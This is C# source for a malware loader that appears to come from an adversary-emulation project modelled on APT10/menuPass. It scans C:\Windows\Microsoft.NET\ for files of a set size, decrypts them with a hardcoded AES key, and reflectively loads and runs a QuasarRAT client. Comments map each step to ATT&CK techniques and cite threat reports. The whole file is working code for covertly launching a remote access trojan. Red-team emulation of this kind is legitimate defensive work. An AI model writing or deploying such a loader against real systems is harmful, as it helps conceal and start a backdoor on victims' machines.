using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace ManagedLoader
{
    public class ManagedLoader
    {

        private static int MAX_SIZE = 6000000;
        private static string TYPE = "Quasar.Client.Program";
        private static string METHOD = "Main";
        private static string path = @"C:\Windows\Microsoft.NET\";
        private static byte[] quasarEncKey =
        {
            0x15, 0x0d, 0x72, 0xfd, 0x6f, 0x9e, 0x18, 0x97,
            0x2b, 0x81, 0x04, 0xe9, 0x14, 0x6d, 0x50, 0x49,
            0xdc, 0x02, 0x0f, 0x62, 0x1f, 0x67, 0xa3, 0xa0,
            0x10, 0xa8, 0xc5, 0x9a, 0x22, 0xad, 0xa1, 0x7d
        };
#if DEBUG
        private static int MIN_SIZE = 0;
        private static bool LOG_ENC = false;
        private static string logPath = @"./QLoaderLogs.txt";
#else
        private static int MIN_SIZE = 1000000;
        private static bool LOG_ENC = true;
        private static string logPath = path + "QLoaderLogs.txt";
#endif

        /**
         * EntryPoint
         *      About:
         *          Entry function for the managed loader. Searches for the target Quasar client module, decrypts it, and loads it
         *      Result:
         *          Loaded Quasar client module
         *      MITRE ATT&CK Techniques:
         *          T1140: Deobfuscate/Decode Files or Information
         *          T1620: Reflective Code Loading
         *      CTI:
         *          https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor
         *          https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
         */
        public static int EntryPoint()
        {
            Logger.InitializeLogger(logPath, encryptLogs: LOG_ENC);

            Logger.Info(" Starting Quasar Client Loader");

            MethodInfo method = null;

#if DEBUG
            method = FindModule(new DirectoryInfo(@"./"));
#endif
            if (method == null)
            {
                method = FindModule(new DirectoryInfo(path));
            }

            if (method == null)
            {
                Logger.Error("Unable to find Quasar Client");
                return 1;
            }

            Logger.Info(" Starting Quasar Client");
            object[] parameters = new object[] { new string[] { } };
            method.Invoke(null, parameters);

            Logger.Info(" Quasar Client started, exiting");
            return 0;
        }

        /**
         * FindModule
         *      About:
         *          Searches the given directory and attempts to decrypt files of a given size - upon successful
         *          decryption, loads the decrypted module and returns the corresponding MethodInfo.
         *      Result:
         *          MethodInfo for loaded Quasar client module, or null if not found. 
         *      MITRE ATT&CK Techniques:
         *          T1140: Deobfuscate/Decode Files or Information
         *          T1620: Reflective Code Loading
         *      CTI:
         *          https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor
         *          https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
         */
        public static MethodInfo FindModule(DirectoryInfo diTop)
        {
            try
            {
                Logger.Debug("Looking for Quasar Client in " + diTop.FullName);
                foreach (FileInfo fi in diTop.EnumerateFiles())
                {
                    try
                    {
                        Logger.Debug("|- Analyzing " + fi.Name);
                        if (!(fi.Length > MIN_SIZE && fi.Length < MAX_SIZE))
                        {
                            Logger.Debug("|  |- Incorrect size, skipping");
                            continue;
                        }

                        Logger.Debug("|  |- Attempting to decrypt");
                        byte[] bytes = Decrypt(fi);

                        Logger.Debug("|  |- Attempting to load");
                        MethodInfo method = Load(bytes);
                        if (method != null)
                        {
                            Logger.Info(" Found Quasar Client " + fi.FullName);
                            return method;
                        }
                        Logger.Error("|  |- Method is null, skipping");
                    }
                    catch (Exception e)
                    {
                        Logger.Error("|  |- Caught exception analyzing file " + fi.Name + ": " + e.Message);
                    }
                }
                foreach (DirectoryInfo di in diTop.EnumerateDirectories("*"))
                {
                    try
                    {
                        MethodInfo method = FindModule(di);
                        if (method != null)
                        {
                            return method;
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.Error("Caught exception analyzing directory " + di.Name + ": " + e.Message);
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Error("Caught exception: " + e.Message);
                return null;
            }
            return null;
        }

        /**
         * Decrypt
         *      About:
         *          Attempts to AES-CBC-256 decrypt the given file.
         *      Result:
         *          Decrypted Quasar client module, or exception upon decryption failure
         *      MITRE ATT&CK Techniques:
         *          T1140: Deobfuscate/Decode Files or Information
         *      CTI:
         *          https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor
         *          https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
         */
        public static byte[] Decrypt (FileInfo fi)
        {
            return Encryption.SimpleDecrypt(quasarEncKey, File.ReadAllBytes(fi.FullName));
        }

        /**
         * Load
         *      About:
         *          Loads the given module bytes.
         *      Result:
         *          MethodInfo for main method for loaded module, or exception.
         *      MITRE ATT&CK Techniques:
         *          T1620: Reflective Code Loading
         *      CTI:
         *          https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor
         *          https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
         */
        public static MethodInfo Load(byte[] bytes)
        {
            try
            {
                Assembly assembly = Assembly.Load(bytes);
                if (assembly == null)
                {
                    Logger.Error("|  |- Failed to get Assembly");
                    return null;
                }

                Type type = assembly.GetType(TYPE);
                if (type == null)
                {
                    Logger.Error("|  |- Failed to get Type");
                    return null;
                }

                MethodInfo method = type.GetMethod(METHOD, BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Static);
                return method;
            }
            catch (Exception e)
            {
                Logger.Error("|  |- Caught exception: " + e.Message);
                return null;
            }
        }
    }
}
